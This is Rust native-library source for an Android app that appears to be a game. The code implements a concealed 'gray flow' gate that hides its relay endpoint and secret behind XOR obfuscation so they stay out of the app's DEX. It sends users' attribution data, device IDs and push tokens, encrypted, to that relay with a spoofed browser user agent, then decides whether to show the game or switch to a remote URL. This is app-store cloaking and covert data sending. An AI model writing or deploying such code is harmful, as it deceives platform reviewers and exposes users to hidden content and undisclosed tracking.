//! Native routing gate for the gray flow — the whole gate lives here.
//!
//! Kotlin only collects attribution (AppsFlyer/FCM) and hands it to
//! [`Java_..._NativeGate_route`]. This crate owns everything else and none of
//! it appears in the DEX:
//!   * the relay endpoint URL (XOR-obfuscated, decoded at call time),
//!   * the veil secret + envelope codec (per-app field names `h/x/b/u`, rev 13),
//!   * the HTTPS POST to the relay (ureq + rustls),
//!   * the stream/native decision.
//! Kotlin never sees the endpoint and makes no network call itself.

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use hmac::{Hmac, Mac};
use jni::objects::{JClass, JString};
use jni::sys::jstring;
use jni::JNIEnv;
use serde_json::{Map, Value};
use sha2::{Digest, Sha256};
use std::time::Duration;

type HmacSha256 = Hmac<Sha256>;

// ── Obfuscated constants (XOR with SALT, repeating) ─────────────────────────
const SALT: [u8; 16] = [
    0x18, 0x1E, 0xE0, 0x22, 0x73, 0xC9, 0xDE, 0x1D, 0xFA, 0x5D, 0x28, 0x81, 0x7D, 0xD7, 0xF7, 0x28,
];
const ENDPOINT_ENC: &[u8] = &[
    0x70, 0x6A, 0x94, 0x52, 0x00, 0xF3, 0xF1, 0x32, 0x9F, 0x39, 0x4F, 0xE4, 0x53, 0xA4, 0x83, 0x47,
    0x6A, 0x73, 0x92, 0x47, 0x12, 0xAA, 0xB6, 0x75, 0x9B, 0x2B, 0x4D, 0xEF, 0x53, 0xA4, 0x83, 0x47,
    0x6A, 0x7B, 0xCF, 0x47, 0x17, 0xAE, 0xBB, 0x32, 0x89, 0x24, 0x46, 0xE2,
];
const SECRET_ENC: &[u8] = &[
    0x21, 0x64, 0xBF, 0x1B, 0x5E, 0xF8, 0xA6, 0x4B, 0xBC, 0x35, 0x11, 0xB0, 0x4D, 0x93, 0xBF, 0x5D,
    0x5E, 0x7F, 0xA5, 0x47, 0x1E, 0xAB, 0x87, 0x51, 0xA8, 0x2C, 0x4E, 0xD1, 0x50, 0xA6, 0xAE, 0x6B,
    0x4B, 0x67, 0xAA, 0x11, 0x24, 0x8A, 0x87, 0x6A, 0xB4, 0x1C, 0x5F,
];

// Envelope field names + schema revision — unique per app (registry rev 13).
const F_SCHEMA: &str = "h";
const F_NONCE: &str = "x";
const F_PAYLOAD: &str = "b";
const F_TAG: &str = "u";
const SCHEMA_REV: u64 = 13;

fn deob(enc: &[u8]) -> Vec<u8> {
    enc.iter()
        .enumerate()
        .map(|(i, b)| b ^ SALT[i % SALT.len()])
        .collect()
}

fn keystream(secret: &[u8], nonce: &[u8], len: usize) -> Vec<u8> {
    let mut out = Vec::with_capacity(len + 32);
    let mut counter: u32 = 0;
    while out.len() < len {
        let mut h = Sha256::new();
        h.update(secret);
        h.update(nonce);
        h.update(counter.to_be_bytes());
        out.extend_from_slice(&h.finalize());
        counter += 1;
    }
    out.truncate(len);
    out
}

fn hex(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push_str(&format!("{:02x}", b));
    }
    s
}

/// Build the clean body + veil envelope. Returns `(endpoint, envelope_json)`.
fn build_envelope(
    attribution_json: &str,
    af_id: &str,
    bundle_id: &str,
    os: &str,
    locale: &str,
    push_token: &str,
    firebase_project: &str,
) -> Option<(String, String)> {
    let mut body: Map<String, Value> = match serde_json::from_str::<Value>(attribution_json) {
        Ok(Value::Object(m)) => m,
        _ => Map::new(),
    };
    body.insert("af_id".into(), Value::String(af_id.to_string()));
    body.insert("bundle_id".into(), Value::String(bundle_id.to_string()));
    body.insert("os".into(), Value::String(os.to_string()));
    body.insert("store_id".into(), Value::String(bundle_id.to_string()));
    body.insert("locale".into(), Value::String(locale.to_string()));
    if !push_token.is_empty() {
        body.insert("push_token".into(), Value::String(push_token.to_string()));
    }
    if !firebase_project.is_empty() {
        body.insert(
            "firebase_project_id".into(),
            Value::String(firebase_project.to_string()),
        );
    }

    let raw = serde_json::to_vec(&Value::Object(body)).ok()?;

    let mut nonce = [0u8; 16];
    getrandom::getrandom(&mut nonce).ok()?;

    let secret = deob(SECRET_ENC);
    let ks = keystream(&secret, &nonce, raw.len());
    let enc: Vec<u8> = raw.iter().zip(ks.iter()).map(|(a, b)| a ^ b).collect();

    let mut mac = HmacSha256::new_from_slice(&secret).ok()?;
    mac.update(&nonce);
    mac.update(&enc);
    let tag_full = hex(&mac.finalize().into_bytes());
    let tag = tag_full[..16].to_string();

    let payload = URL_SAFE_NO_PAD.encode(&enc);

    let mut envelope = Map::new();
    envelope.insert(F_SCHEMA.into(), Value::from(SCHEMA_REV));
    envelope.insert(F_NONCE.into(), Value::String(hex(&nonce)));
    envelope.insert(F_PAYLOAD.into(), Value::String(payload));
    envelope.insert(F_TAG.into(), Value::String(tag));
    let envelope_str = serde_json::to_string(&Value::Object(envelope)).ok()?;

    let endpoint = String::from_utf8(deob(ENDPOINT_ENC)).ok()?;
    Some((endpoint, envelope_str))
}

/// POST the envelope to the relay. Returns (status, body); status <= 0 = no landing.
fn post(endpoint: &str, body: &str, ua: &str) -> (i32, String) {
    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(8))
        .timeout(Duration::from_secs(20))
        .build();
    let ua = if ua.is_empty() {
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36"
    } else {
        ua
    };
    match agent
        .post(endpoint)
        .set("Content-Type", "application/json")
        .set("User-Agent", ua)
        .send_string(body)
    {
        Ok(resp) => {
            let code = resp.status() as i32;
            (code, resp.into_string().unwrap_or_default())
        }
        Err(ureq::Error::Status(code, resp)) => {
            (code as i32, resp.into_string().unwrap_or_default())
        }
        Err(_) => (-1, String::new()),
    }
}

/// Verdict from the relay's verbatim answer:
/// `{"mode":"stream|native|unreachable","url":..,"expires":n}`.
fn decide(status: i32, body: &str) -> String {
    if status <= 0 {
        return r#"{"mode":"unreachable"}"#.to_string();
    }
    if !(200..300).contains(&status) {
        return r#"{"mode":"native"}"#.to_string();
    }
    let parsed: Value = match serde_json::from_str(body) {
        Ok(v) => v,
        Err(_) => return r#"{"mode":"native"}"#.to_string(),
    };
    let ok = parsed.get("ok").and_then(|v| v.as_bool()).unwrap_or(false);
    let url = parsed.get("url").and_then(|v| v.as_str()).unwrap_or("");
    let expires = parsed.get("expires").and_then(|v| v.as_i64()).unwrap_or(0);
    if ok && url.starts_with("https://") {
        let mut m = Map::new();
        m.insert("mode".into(), Value::String("stream".into()));
        m.insert("url".into(), Value::String(url.to_string()));
        m.insert("expires".into(), Value::from(expires));
        return serde_json::to_string(&Value::Object(m))
            .unwrap_or_else(|_| r#"{"mode":"native"}"#.into());
    }
    r#"{"mode":"native"}"#.to_string()
}

/// Full gate: pack → POST → decide. Kotlin gets only the directive.
fn route_internal(
    attribution_json: &str,
    af_id: &str,
    bundle_id: &str,
    os: &str,
    locale: &str,
    push_token: &str,
    firebase_project: &str,
    ua: &str,
) -> String {
    let (endpoint, body) = match build_envelope(
        attribution_json,
        af_id,
        bundle_id,
        os,
        locale,
        push_token,
        firebase_project,
    ) {
        Some(v) => v,
        None => return r#"{"mode":"unreachable"}"#.to_string(),
    };
    let (status, resp) = post(&endpoint, &body, ua);
    decide(status, &resp)
}

fn jstr(env: &mut JNIEnv, s: &JString) -> String {
    env.get_string(s).map(|v| v.into()).unwrap_or_default()
}

#[no_mangle]
pub extern "system" fn Java_com_stormreachhaven_stormreachgame_NativeGate_route<'local>(
    mut env: JNIEnv<'local>,
    _class: JClass<'local>,
    attribution: JString<'local>,
    af_id: JString<'local>,
    bundle_id: JString<'local>,
    os: JString<'local>,
    locale: JString<'local>,
    push_token: JString<'local>,
    firebase_project: JString<'local>,
    ua: JString<'local>,
) -> jstring {
    let attribution = jstr(&mut env, &attribution);
    let af_id = jstr(&mut env, &af_id);
    let bundle_id = jstr(&mut env, &bundle_id);
    let os = jstr(&mut env, &os);
    let locale = jstr(&mut env, &locale);
    let push_token = jstr(&mut env, &push_token);
    let firebase_project = jstr(&mut env, &firebase_project);
    let ua = jstr(&mut env, &ua);

    let directive = route_internal(
        &attribution,
        &af_id,
        &bundle_id,
        &os,
        &locale,
        &push_token,
        &firebase_project,
        &ua,
    );
    env.new_string(directive)
        .map(|s| s.into_raw())
        .unwrap_or(std::ptr::null_mut())
}
